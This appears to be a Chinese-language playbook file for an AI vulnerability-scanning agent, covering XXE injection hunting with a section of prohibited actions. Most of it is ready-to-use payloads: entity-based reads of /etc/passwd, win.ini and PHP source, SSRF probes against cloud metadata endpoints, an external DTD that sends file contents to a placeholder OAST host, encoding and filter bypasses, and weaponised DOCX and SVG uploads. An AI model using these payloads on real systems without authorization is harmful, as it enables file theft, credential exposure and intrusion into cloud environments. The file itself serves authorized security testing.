---
name: hunt-xxe
description: XXE 实体注入：基础外带/盲注 OOB/XXE 转 SSRF/文件读、参数实体与编码绕过、Office 文档（DOCX/XLSX）与 SVG 上传点、外部 DTD 中继
whenToUse: 发现 XML 解析点（SOAP、REST 收 XML、RSS、SVG 上传）、Office 文档上传后服务端解析、或响应里出现 XML 解析报错时
role: vuln-scan
enabled: true
---

# XXE 外部实体注入

## 1. 注入面（任何"服务端解析 XML"的地方）

| 入口 | 信号 |
|---|---|
| SOAP 接口 | `Content-Type: text/xml`、`SOAPAction` |
| REST 收 XML | 请求 body 是 XML / 支持 `application/xml` |
| Office 上传 | DOCX/XLSX/PPTX 本质是 ZIP+XML，服务端解析即触发 |
| SVG 上传 | SVG 是 XML，头像/图标上传后服务端缩略图处理 |
| RSS / OPML 导入 | 订阅源导入功能 |
| SAML | 见 `hunt-saml`，SAMLResponse 是 Base64 的 XML |
| 文件转换/预览 | 文档转 PDF、Excel 导入 |
| 前端报错 | 响应含 `SAXParseException` / `DOCTYPE` 相关堆栈 |

## 2. 判定阶梯（无害优先）

**第 1 级：实体求值确认**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe "test123">]>
<root>&xxe;</root>
```

响应里 `test123` 出现 = 实体被求值，接着才试文件读。

**第 2 级：文件读（Linux）**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**第 3 级：文件读（Windows）**

```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

**第 4 级：PHP 源码（base64 防截断）**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

**第 5 级：XXE → SSRF**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

云元数据端点（云上目标必试）：AWS/GCP `169.254.169.254`、阿里云 `100.100.100.200`、腾讯云 `metadata.tencentyun.com`。

## 3. 盲注 OOB（无回显时的唯一出路）

**外部 DTD 中继** —— 先在自己的 HTTP 服务放 `evil.dtd`：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OAST/?d=%file;'>">
%eval;
```

请求体：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://OAST/evil.dtd">
  %xxe;
]>
<root>test</root>
```

看 OAST 是否收到回连。**注意**：`%file` 里含换行会被 DTD 语法打断，多数场景只能外带短文件（`/etc/hostname`、`/proc/self/environ` 的部分行）。要外带长文件需走 FTP/多级参数实体。

**纯外带探测（连 DTD 都不需要）**

```xml
<!ENTITY xxe SYSTEM "http://OAST/probe">
```

只要 OAST 收到 DNS/HTTP 请求，就证明外部实体未被禁用 —— 这已经是一个可报告的低危 XXE。

## 4. 绕过矩阵

| 拦截 | 绕过 |
|---|---|
| 过滤 `<!ENTITY` | 参数实体 `%xxe`、外部 DTD 引入 |
| 过滤 `SYSTEM` | `PUBLIC` 标识符、`&#x53;YSTEM` 实体编码 |
| 过滤 `file://` | `php://filter`、`expect://`、`jar://`、`netdoc://`（Java） |
| 只解析不报错 | 走 OOB 外带 |
| 内容长度限制 | 只打 `/etc/hostname`、`/proc/version` 这类短文件 |
| WAF 认 UTF-8 特征 | 改 `encoding="UTF-16"` 或 UTF-7 |

## 5. 文档型 XXE（上传点专用）

DOCX/XLSX 是 ZIP，解开改 `word/document.xml` 或 `xl/sharedStrings.xml`，在根元素前插入 DOCTYPE：

```bash
mkdir x && cd x && unzip ../sample.docx
# 在 word/document.xml 首行后插入 <!DOCTYPE ...>
zip -r ../evil.docx .
```

SVG 直接就是 XML，改文本即可：

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
</svg>
```

## 6. 判定与产出

| 结果 | 定性 |
|---|---|
| 读到 `/etc/passwd` 内容 | P1（任意文件读），若读到配置含凭据 → P0 链 |
| OOB 回连但无回显 | P2–P3（盲 XXE） |
| 打到云元数据 | P1，拿到角色名即定性（不接管） |
| 实体报错但被禁用 | 不算漏洞，记录为加固正确 |

- 落库：`category=xxe`，`usage` 记「入口 → 判定级 → 外带方式」。
- 只读证明：元数据只取 IAM 角色名；文件只取前 5 行并脱敏。
- 与 `hunt-saml`（SAML XXE）、`hunt-ssrf`（XXE→SSRF）、`hunt-file-upload`（文档上传）联动。

## 7. 不要做的事

- 禁：用读到的私钥/凭据登录任何服务。
- 禁：报 `/etc/shadow`。
- 禁：对 OAST 之外的真实第三方发起请求。
- 禁：把读到的文件上传到任何外部存储。

<!-- 改编自: src-hunter references/playbooks/rce/15-xxe.md + PayloadsAllTheThings/XXE Injection, 2026-11-01 -->
